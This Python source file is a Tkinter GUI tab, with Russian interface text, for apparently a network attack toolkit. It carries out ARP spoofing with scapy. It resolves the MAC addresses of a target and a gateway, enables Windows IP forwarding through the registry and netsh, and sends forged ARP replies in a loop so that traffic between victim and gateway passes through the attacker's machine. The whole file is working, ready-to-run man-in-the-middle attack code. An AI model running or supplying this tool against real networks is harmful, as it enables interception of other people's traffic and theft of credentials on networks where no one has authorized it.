"""ARP spoofing tab."""
import os
import time
import threading
import subprocess
import winreg
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sendp, srp
from scapy.all import get_if_hwaddr

class ArpSpoofTabMixin:
    # -------------------- ARP Spoofing (без изменений) --------------------
    def setup_arp_spoof_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        params_frame = ttk.LabelFrame(left_frame, text="Параметры ARP Spoofing")
        params_frame.pack(fill='x', padx=5, pady=5)
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="IP цели:", width=12).pack(side='left', padx=2)
        self.arp_target_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
        self.arp_target_ip.pack(side='left', padx=2)
        self.arp_target_ip.insert(0, "192.168.1.2")
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="IP шлюза:", width=12).pack(side='left', padx=2)
        self.arp_gateway_ip = ttk.Entry(row2, width=25, font=('Arial', 9))
        self.arp_gateway_ip.pack(side='left', padx=2)
        self.arp_gateway_ip.insert(0, "192.168.1.1")
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.arp_spoof_interface = ttk.Combobox(row3, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.arp_spoof_interface.pack(side='left', padx=2)
        self.arp_spoof_interface.set(self.active_interface)
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Интервал (сек):", width=12).pack(side='left', padx=2)
        self.arp_spoof_interval = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.arp_spoof_interval.pack(side='left', padx=2)
        self.arp_spoof_interval.insert(0, "2")
        self.restore_arp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(params_frame, text="Восстанавливать ARP после остановки", variable=self.restore_arp_var).pack(anchor='w', padx=5, pady=2)
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        self.arp_spoof_start_btn = ttk.Button(button_frame, text="Начать ARP Spoofing", 
                                            command=self.start_arp_spoof, width=18)
        self.arp_spoof_start_btn.pack(side='left', padx=5)
        self.arp_spoof_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                           command=self.stop_arp_spoof, width=15, state='disabled')
        self.arp_spoof_stop_btn.pack(side='left', padx=5)
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.arp_spoof_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.arp_spoof_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.arp_spoof_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        log_frame = ttk.LabelFrame(right_frame, text="Лог ARP Spoofing")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.arp_spoof_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.arp_spoof_log.pack(fill='both', expand=True, padx=5, pady=5)
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.arp_spoof_log), width=14).pack()
        self.arp_spoof_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'last_update': 0,
            'last_sent': 0
        }

    def start_arp_spoof(self):
        target_ip = self.arp_target_ip.get().strip()
        gateway_ip = self.arp_gateway_ip.get().strip()
        iface = self.arp_spoof_interface.get()
        try:
            interval = float(self.arp_spoof_interval.get())
        except Exception as e:
            print(f"[Gotcha] error: {e}")
            interval = 2.0
        self.arp_spoof_log.insert("end", f"Resolve MAC {target_ip} / {gateway_ip}...\n")
        target_mac = self.get_mac_by_ip(target_ip, iface)
        gateway_mac = self.get_mac_by_ip(gateway_ip, iface)
        if not target_mac or not gateway_mac:
            self.arp_spoof_log.insert(
                "end",
                f"Не удалось получить MAC (target={target_mac}, gateway={gateway_mac}). Старт отменён.\n",
            )
            messagebox.showerror("ARP Spoof", "MAC цели или шлюза не найден. Проверьте IP и интерфейс.")
            return
        self._arp_target_mac = target_mac
        self._arp_gateway_mac = gateway_mac
        self.arp_spoof_running = True
        self.arp_spoof_start_btn.config(state="disabled")
        self.arp_spoof_stop_btn.config(state="normal")
        self.arp_spoof_stats = {
            "start_time": time.time(),
            "sent_packets": 0,
            "last_update": time.time(),
            "last_sent": 0,
        }
        self.enable_ip_forward(True)
        self.arp_spoof_log.insert("end", f"Target MAC={target_mac}, Gateway MAC={gateway_mac}\n")
        self.arp_spoof_thread = threading.Thread(
            target=self.arp_spoof_worker,
            args=(target_ip, gateway_ip, iface, interval, target_mac, gateway_mac),
            daemon=True,
        )
        self.arp_spoof_thread.start()
        self.update_arp_spoof_stats()
        self.arp_spoof_log.insert("end", f"ARP Spoofing started (interval: {interval}s, unicast)\n")
        self.status_var.set("ARP Spoofing запущен")

    def stop_arp_spoof(self):
        self.arp_spoof_running = False
        self.arp_spoof_start_btn.config(state='normal')
        self.arp_spoof_stop_btn.config(state='disabled')
        if self.arp_spoof_thread and self.arp_spoof_thread.is_alive():
            self.arp_spoof_thread.join(timeout=1.0)
        # IP forwarding оставляем до закрытия программы (on_closing)
        if self.restore_arp_var.get():
            self.restore_arp()
        total_time = time.time() - self.arp_spoof_stats['start_time']
        total_packets = self.arp_spoof_stats['sent_packets']
        total_bytes = total_packets * 42
        self.arp_spoof_log.insert('end', "\n--- Results ---\n")
        self.arp_spoof_log.insert('end', f"Total packets sent: {total_packets}\n")
        self.arp_spoof_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
        if total_time > 0:
            self.arp_spoof_log.insert('end', f"Avg rate: {int(total_packets/total_time)} pps\n")
        self.arp_spoof_log.insert('end', f"Total data: {total_bytes} bytes\n")
        if total_time > 0:
            self.arp_spoof_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
        self.status_var.set("ARP Spoofing остановлен")

    def _netsh_iface_name(self, scapy_iface: str) -> str:
        """Попытка сопоставить NPF/Scapy имя с именем для netsh."""
        # Уже короткое имя
        if scapy_iface and not scapy_iface.startswith(r"\\Device\\") and "NPF" not in scapy_iface:
            return scapy_iface
        try:
            import psutil
            for name, addrs in psutil.net_if_addrs().items():
                try:
                    smac = get_if_hwaddr(scapy_iface).lower().replace("-", ":")
                except Exception:
                    smac = ""
                for a in addrs:
                    mac = getattr(a, "address", "") or ""
                    mac = mac.lower().replace("-", ":")
                    if smac and mac == smac:
                        return name
        except Exception:
            pass
        return scapy_iface

    def enable_ip_forward(self, enable):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                0,
                winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE,
            )
            if enable and not getattr(self, "_ip_forward_saved", False):
                try:
                    old, _ = winreg.QueryValueEx(key, "IPEnableRouter")
                    self._ip_forward_original = int(old)
                except Exception:
                    self._ip_forward_original = 0
                self._ip_forward_saved = True
            val = 1 if enable else int(getattr(self, "_ip_forward_original", 0))
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, val)
            winreg.CloseKey(key)
            iface = self._netsh_iface_name(self.arp_spoof_interface.get())
            subprocess.run(
                [
                    "netsh",
                    "interface",
                    "ipv4",
                    "set",
                    "interface",
                    iface,
                    "forwarding=" + ("enabled" if enable else "disabled"),
                ],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
            )
            self._ip_forward_enabled_by_us = bool(enable)
            self.arp_spoof_log.insert(
                "end", f"IP forwarding {'ON' if enable else 'restored'} (netsh iface={iface})\n"
            )
        except Exception as e:
            self.arp_spoof_log.insert("end", f"Не удалось изменить IP forwarding: {e}\n")

    def restore_arp(self):
        try:
            target_ip = self.arp_target_ip.get()
            gateway_ip = self.arp_gateway_ip.get()
            iface = self.arp_spoof_interface.get()
            target_mac = self.get_mac_by_ip(target_ip, iface)
            gateway_mac = self.get_mac_by_ip(gateway_ip, iface)
            if target_mac and gateway_mac:
                pkt = Ether(dst=target_mac) / ARP(
                    op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac
                )
                sendp(pkt, iface=iface, verbose=0)
                self.arp_spoof_log.insert(
                    "end", f"Восстановлен ARP для цели: {target_ip} -> {gateway_mac}\n"
                )
                pkt = Ether(dst=gateway_mac) / ARP(
                    op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac
                )
                sendp(pkt, iface=iface, verbose=0)
                self.arp_spoof_log.insert(
                    "end", f"Восстановлен ARP для шлюза: {gateway_ip} -> {target_mac}\n"
                )
            else:
                self.arp_spoof_log.insert(
                    "end",
                    f"Restore skip: target_mac={target_mac}, gateway_mac={gateway_mac}\n",
                )
        except Exception as e:
            self.arp_spoof_log.insert("end", f"Ошибка восстановления ARP: {e}\n")

    def get_mac_by_ip(self, ip, iface):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, iface=iface)
            for _, rcv in ans:
                return rcv.hwsrc
        except Exception as e:
            print(f"[Gotcha] suppressed: {e}")
        return None

    def update_arp_spoof_stats(self):
        if not self.arp_spoof_running:
            return
        current_time = time.time()
        duration = current_time - self.arp_spoof_stats['start_time']
        time_diff = current_time - self.arp_spoof_stats['last_update']
        if time_diff >= 1:
            packets_sent = self.arp_spoof_stats['sent_packets'] - self.arp_spoof_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            self.arp_spoof_rate.config(text=f"{int(current_rate)}")
            self.arp_spoof_stats['last_update'] = current_time
            self.arp_spoof_stats['last_sent'] = self.arp_spoof_stats['sent_packets']
        self.arp_spoof_sent.config(text=str(self.arp_spoof_stats['sent_packets']))
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.arp_spoof_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        if self.arp_spoof_running:
            self.root.after(1000, self.update_arp_spoof_stats)

    def arp_spoof_worker(self, target_ip, gateway_ip, interface, interval, target_mac, gateway_mac):
        try:
            packet_count = 0
            attacker_mac = get_if_hwaddr(interface)
            while self.arp_spoof_running:
                arp_to_target = Ether(dst=target_mac) / ARP(
                    op=2,
                    psrc=gateway_ip,
                    hwsrc=attacker_mac,
                    pdst=target_ip,
                    hwdst=target_mac,
                )
                arp_to_gateway = Ether(dst=gateway_mac) / ARP(
                    op=2,
                    psrc=target_ip,
                    hwsrc=attacker_mac,
                    pdst=gateway_ip,
                    hwdst=gateway_mac,
                )
                sendp(arp_to_target, iface=interface, verbose=0)
                sendp(arp_to_gateway, iface=interface, verbose=0)
                packet_count += 2
                self.arp_spoof_stats["sent_packets"] = packet_count
                sleep_time = interval
                step = 0.1
                while sleep_time > 0 and self.arp_spoof_running:
                    time.sleep(min(step, sleep_time))
                    sleep_time -= step
        except Exception as e:
            try:
                self.root.after(0, lambda: self.arp_spoof_log.insert("end", f"ARP Spoofing error: {e}\n"))
            except Exception:
                pass

